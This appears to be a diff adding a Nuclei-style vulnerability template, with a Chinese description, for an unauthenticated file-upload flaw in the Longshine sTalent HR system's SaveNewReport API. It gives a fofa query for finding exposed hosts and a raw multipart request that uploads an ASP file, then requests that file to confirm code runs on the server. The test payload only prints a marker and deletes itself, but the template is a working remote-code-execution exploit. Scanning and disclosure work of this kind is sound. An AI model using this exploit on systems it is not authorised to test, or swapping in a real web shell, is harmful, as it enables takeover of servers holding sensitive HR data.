@@ -1,0 +1,42 @@
+id: longshine-stalent-savenewreport-upload
+
+info:
+  name: 朗新sTalent系统api SaveNewReport接口文件上传漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: "/js/Comm/loadingsmall.js" && icon_hash="1772087922"
+          北京朗新天霁软件技术有限公司研发的朗新sTalent人力资源管理系统，其/api/Report/SaveNewReport接口未正确校验文件上传请求。攻击者可利用该接口上传恶意文件以实现远程代码执行，进而获取系统控制权或敏感数据。
+          文件存储路径:
+          /report/newReportFiles/1_1.txt
+          /report/newReportFiles/{rptId}_filename
+          
+          新版本接口路径:
+          /api/Report/Report/SaveNewReport
+  tags: 朗新sTalent
+
+http:
+  - raw:
+    - |
+      POST /api/Report/SaveNewReport?rptId=2 HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: multipart/form-data; boundary=7e14e267b081de44454417c892579161b33a66cefc9023d14918e3be82cf
+
+      --7e14e267b081de44454417c892579161b33a66cefc9023d14918e3be82cf
+      Content-Disposition: form-data; name="file"; filename="NTest.asp"
+      Content-Type: application/octet-stream
+
+      <% Response.Write("NdayTest"); set myfso=server.CreateObject("scripting.filesystemobject"); myfso.DeleteFile(Server.MapPath("NTest.asp")); %>
+      --7e14e267b081de44454417c892579161b33a66cefc9023d14918e3be82cf--
+    - |
+      GET /NTest.asp HTTP/1.1
+      Host: {{Hostname}}
+      
+    matchers-condition: and
+    matchers:
+    - type: status
+      status: [200]
+    - type: word
+      part: body
+      words:
+      - 'NdayTest'
